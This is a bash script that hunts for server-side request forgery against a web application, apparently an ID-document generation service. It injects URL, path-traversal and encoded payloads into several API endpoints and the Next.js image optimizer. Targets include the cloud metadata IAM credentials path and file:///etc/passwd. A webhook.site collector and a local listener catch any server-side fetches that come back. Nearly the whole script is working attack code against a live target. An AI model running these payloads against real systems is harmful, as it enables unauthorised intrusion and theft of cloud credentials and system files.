#!/bin/bash
# Hunt 3: SSRF hunting.
#  - webhook.site collector (ours) to detect server-side fetches
#  - WSL python listener as a second collector
#  - /api/submit-photoshop-job photoUrl / backgroundPhoto URL injection (gate may block)
#  - /api/status/<jobId> path injection
#  - /api/supabase proxy path manipulation
#  - Next.js image optimizer /_next/image?url= (classic SSRF surface)
#  - /api/remove-background multipart filename/field injection
source "$(dirname "$0")/env.sh"

WEBHOOK_ID="385d7c4b-5f1a-4bee-b1e7-4a3321bcd317"
WEBHOOK="https://webhook.site/$WEBHOOK_ID"
REQ_API="https://webhook.site/token/$WEBHOOK_ID/requests"
WSLIP=$(hostname -I 2>/dev/null | awk '{print $1}')
echo "WSL ip: $WSLIP"
echo "webhook: $WEBHOOK"

webhook_state() {
  echo "--- webhook.site captured requests ---"
  curl -sS -m 20 -A "$UA" "$REQ_API" -o /tmp/wh.json -w 'collector HTTP %{http_code}\n' || true
  python3 - <<'PY'
import json
try:
    d=json.load(open('/tmp/wh.json'))
except Exception as e:
    print('collector parse err:', e, open('/tmp/wh.json').read()[:200]); raise SystemExit
data=d.get('data',d) if isinstance(d,dict) else d
print('captured:', len(data))
for r in data[:20]:
    print('  ', r.get('method'), str(r.get('url'))[:160], 'from', r.get('ip'))
PY
}

echo "########## 0. Self-test collector (direct request from WSL) ##########"
curl -sS -m 20 -A "$UA" "$WEBHOOK/ssrf-selftest?phase=selftest" -o /dev/null -w 'selftest HTTP %{http_code}\n'
sleep 2
webhook_state

echo "########## 1. Start WSL listener on :8899 ##########"
cd /tmp
python3 -m http.server 8899 --bind 0.0.0.0 > /tmp/ssrf-listener.log 2>&1 &
LISTPID=$!
sleep 1
curl -sS -m 10 -A "$UA" -o /dev/null -w 'local listener check HTTP %{http_code}\n' "http://$WSLIP:8899/local-selftest" || true

echo "########## 2. /api/submit-photoshop-job with URL fields (auth required) ##########"
cat > /tmp/photoshop-body.json <<JSON
{"gender":"male","hologram":true,"country":"usa","city":"New York","stateCode":null,"province":null,
 "documentType":"id_card","revision":"2010","firstName":"Test","middleName":"","lastName":"Audit",
 "birthday":"01/01/1990","issueDate":"01/01/2024","expiryDate":"01/01/2030","docNumber":"123456789",
 "cuit":null,"optionalData1":null,"optionalData2":null,"optionalData3":null,"address":"1 Audit Way",
 "signatureWidth":3,"photoUrl":"$WEBHOOK/ssrf-photoshop","signature":"","removeWatermark":false,
 "generationType":"standard","backgroundPhoto":"$WEBHOOK/ssrf-background","backgroundOrientation":"landscape",
 "mrz":null,"pdf417Data":null,"code128Data":null,"code39Data":null,"itfData":null,"qrData":null,
 "qrData2":null,"dataMatrixData":null,"metadataEnabled":false,"deviceProfile":null,
 "metadataDate":null,"metadataHour":null,"metadataMinute":null,"metadataSecond":null,
 "gpsEnabled":false,"metadataLat":null,"metadataLng":null}
JSON
for variant in "$WEBHOOK/ssrf-photoshop" "http://$WSLIP:8899/ssrf-photoshop" "http://169.254.169.254/latest/meta-data/" "file:///etc/passwd"; do
  sed "s#\"photoUrl\":\"[^\"]*\"#\"photoUrl\":\"$variant\"#" /tmp/photoshop-body.json > /tmp/photoshop-v.json
  echo "--- photoUrl=$variant"
  code=$(curl -sS -k -m 25 -A "$UA" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -X POST --data-binary @/tmp/photoshop-v.json -o /tmp/b.bin -w "%{http_code}" "$SITE/api/submit-photoshop-job")
  echo "HTTP $code : $(head -c 300 /tmp/b.bin | tr -d '\n')"
done
echo "--- control: empty body"
curl -sS -k -m 25 -A "$UA" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d '{}' -o /tmp/b.bin -w 'HTTP %{http_code} : ' "$SITE/api/submit-photoshop-job"; head -c 300 /tmp/b.bin; echo
sleep 2
webhook_state

echo "########## 3. /api/status/<jobId> path injection ##########"
for jid in "https:%2F%2Fwebhook.site%2F$WEBHOOK_ID%2Fssrf-status" "http:%2F%2F$WSLIP:8899%2Fssrf-status" "%2F%2Fwebhook.site%2F$WEBHOOK_ID%2Fssrf-status" "..%2F..%2F..%2Fetc%2Fpasswd" "http://169.254.169.254/latest/meta-data/" "webhook.site@$WEBHOOK_ID"; do
  echo "--- /api/status/$jid"
  code=$(curl -sS -k -m 25 -A "$UA" -o /tmp/b.bin -w "%{http_code}" "$SITE/api/status/$jid")
  echo "HTTP $code : $(head -c 220 /tmp/b.bin | tr -d '\n')"
done
sleep 2
webhook_state

echo "########## 4. /api/supabase proxy path manipulation ##########"
for p in "rest/v1/../../webhook.site/$WEBHOOK_ID/x" "//webhook.site/$WEBHOOK_ID/supaproxy" "https:/webhook.site/$WEBHOOK_ID/supaproxy" "%2F%2Fwebhook.site%2F$WEBHOOK_ID%2Fsupaproxy"; do
  echo "--- /api/supabase/$p"
  code=$(curl -sS -k -m 25 -A "$UA" -H "apikey: $KEY" -o /tmp/b.bin -w "%{http_code}" "$SITE/api/supabase/$p")
  echo "HTTP $code : $(head -c 200 /tmp/b.bin | tr -d '\n')"
done

echo "########## 5. Next.js image optimizer SSRF ##########"
for u in "$WEBHOOK/ssrf-nextimage.png" "http://$WSLIP:8899/ssrf-nextimage.png" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "file:///etc/passwd"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")
  echo "--- /_next/image?url=$u"
  code=$(curl -sS -k -m 30 -A "$UA" -o /tmp/b.bin -w "%{http_code}" "$SITE/_next/image?url=$enc&w=64&q=75")
  echo "HTTP $code bytes=$(wc -c < /tmp/b.bin) : $(head -c 200 /tmp/b.bin | tr -d '\n')"
done
sleep 2
webhook_state

echo "########## 6. /api/remove-background multipart field injection ##########"
echo "not-an-image" > /tmp/notimg.bin
code=$(curl -sS -k -m 25 -A "$UA" -F "file=@/tmp/notimg.bin;type=image/png" -F "url=$WEBHOOK/ssrf-removebg" -F "imageUrl=$WEBHOOK/ssrf-removebg" -o /tmp/b.bin -w "%{http_code}" "$SITE/api/remove-background")
echo "multipart+url fields -> HTTP $code : $(head -c 300 /tmp/b.bin | tr -d '\n')"
code=$(curl -sS -k -m 25 -A "$UA" -F "file=$WEBHOOK/ssrf-removebg2;type=image/png" -o /tmp/b.bin -w "%{http_code}" "$SITE/api/remove-background")
echo "file value = URL string -> HTTP $code : $(head -c 300 /tmp/b.bin | tr -d '\n')"
sleep 2
webhook_state

echo "########## 7. WSL listener hits (would indicate server-side fetch if target could reach us) ##########"
grep -E "GET|POST" /tmp/ssrf-listener.log | tail -20
kill "$LISTPID" 2>/dev/null
echo "listener stopped"

echo "########## 8. Final webhook state ##########"
webhook_state
